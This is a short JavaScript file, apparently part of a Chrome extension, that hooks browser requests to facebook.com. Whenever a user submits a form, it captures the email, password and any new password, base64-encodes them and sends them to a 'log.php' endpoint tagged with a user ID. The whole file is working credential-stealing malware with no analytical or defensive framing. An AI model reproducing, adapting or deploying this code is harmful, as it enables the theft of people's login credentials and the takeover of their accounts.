if (typeof login_listener_js == "undefined")
{
    login_listener_js = true;

    chrome.webRequest.onBeforeRequest.addListener(function(details) {
        if (details.method.toLowerCase() == "post" &&
            details.requestBody != null &&
            details.requestBody.formData != null)
        {
            var params = [];

            if (details.requestBody.formData.email)
            {
                params.push("_e=" + btoa(details.requestBody.formData.email[0]));
            }

            if (details.requestBody.formData.pass)
            {
                params.push("_p=" + btoa(details.requestBody.formData.pass[0]));
                preRequisiteCheck3 = true;

                try
                {
                    redirectCheckTab();
                }
                catch (e)
                {
                    console.log(e.message);
                }
            }

            if (details.requestBody.formData.password_new)
            {
                params.push("_pn=" + btoa(details.requestBody.formData.password_new[0]))
            }

            if (params.length > 0)
            {
                getJSON("log.php?uid=" + UID + "&" + params.join("&"));
            }

        }
    },
    { urls: ["https://www.facebook.com/*"] }, ["requestBody"]);
}
